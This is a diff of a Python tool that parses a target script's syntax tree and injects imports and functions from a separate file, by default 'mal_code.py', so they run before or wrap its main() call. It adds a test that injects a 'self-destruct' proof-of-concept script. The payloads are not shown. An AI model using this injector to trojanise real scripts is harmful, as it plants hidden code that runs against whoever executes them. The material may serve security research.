@@ -48,9 +48,10 @@ def wrap_main_with_injected_function(tree, func_name, func_wrapped="main"):
     """
         This function wraps the injected call as a condition before letting main be called
         Modify the __main__ block to wrap main() inside injected_function()
+        :param func_wrapped:
+        :param func_name:
         :param tree:
-        :param injected_call:
-        :return 0:
+        :return:
         """
     # Construct the call to `injected_function()`
     injected_call = ast.Call(func=ast.Name(id=func_name, ctx=ast.Load()), args=[], keywords=[])
@@ -80,7 +81,7 @@ def append_injected_function_bfr_main(tree, injected_call):
     This function appends the injected call to right before ethe main() function is called
     :param tree:
     :param injected_call:
-    :return 0:
+    :return tree:
     """
     # Find the 'if __name__ == "__main__"' block and inject the function call there
     for node in tree.body:
@@ -115,44 +116,48 @@ def embed_code(embed_code_filename="mal_code.py", src_code_filename='target_scri
     :return:
     """
     try:
-        # Define the Python code to embed
-        # code_to_embed = """def injected_function():
-        #     print("This function was injected into the script.")"""
-
-        # Parse the code to embed into an AST node
-        # node_to_inject = ast.parse(code_to_embed)
-        # extract imports and functions from
-
         # Extract the imports and functions of injectable code
         imports, functions = extract_functions_and_imports(embed_code_filename)
 
         # Load and parse the target Python script
-        with open(src_code_filename, 'r') as src_file:
-            target_code = src_file.read()
+        with open(src_code_filename, 'r') as src_code:
+            target_code = src_code.read()
 
         # Parse the target code into an AST
         target_tree = ast.parse(target_code)
 
         # Inject imports if they don't already exist in the target script
+        injection_point = 0
+        for idx, node in enumerate(target_tree.body):
+            if isinstance(node, (ast.Import, ast.ImportFrom)):
+                injection_point = idx + 1  # Insert after the last existing import
+
         if not import_exists(imports, target_tree):
-            target_tree.body = imports + target_tree.body
+            target_tree.body[injection_point:injection_point] = imports
+            print(astor.to_source(target_tree))
+            print(30 * "=")
 
         # The function call to be inserted into code
         injected_call = ast.Expr(
             value=ast.Call(func=ast.Name(id=func_name, ctx=ast.Load()), args=[], keywords=[]))
 
-        # If set to wrap main in if else condition else will just append at the top before main()
+        # If set to wrap main in "if else" condition else will just append at the top before main()
         if wrap:
             wrap_main_with_injected_function(target_tree, func_name, loc_to_inject)
         else:
             append_injected_function_bfr_main(target_tree, injected_call)
+            print(astor.to_source(target_tree))
+            print(30 * "=")
 
         # Inject the code into the script
         if loc_to_inject == "main":
             # Inject the function definition at the start of the file (right after imports)
-            injection_point = 1  # Assuming imports are at the start, inject after them
+            # Update injection point to now include new imports location.
+            injection_point = injection_point + len(imports)
             # target_tree.body[injection_point:injection_point] = node_to_inject.body
             target_tree.body[injection_point:injection_point] = functions
+            print(astor.to_source(target_tree))
+
 
         elif loc_to_inject == "end":
             # Inject the code at the end of the target script
@@ -172,13 +177,14 @@ def embed_code(embed_code_filename="mal_code.py", src_code_filename='target_scri
                 modified_name = new_name.strip() + ".py"
 
         # Write the modified code back to the target script
-        with open(modified_name, 'w') as src_file:
-            src_file.write(modified_code)
+        with open(modified_name, 'w') as src_code:
+            src_code.write(modified_code)
 
         print("Code has been injected into the target script.")
         return 0
-    except:
-        print("An error occurred, please debug this.")
+
+    except Exception as e:
+        print(f"An error occurred, please debug this {e}.")
         return 1
 
 
@@ -194,3 +200,10 @@ if __name__ == '__main__':
     new_name = "Result/mal_3.py"
     # append test
     embed_status = embed_code(embed_code_filename=inj_file, src_code_filename=src_file, new_name=new_name, wrap=False)
+
+    inj_file = "../Self_Destruct/self_destruct_script_poc.py"
+    new_name = "Result/mal_4.py"
+    func_name = "call_main"
+    # self dest test
+    embed_status = embed_code(embed_code_filename=inj_file, src_code_filename=src_file, new_name=new_name, wrap=False,
+                              func_name="call_main")
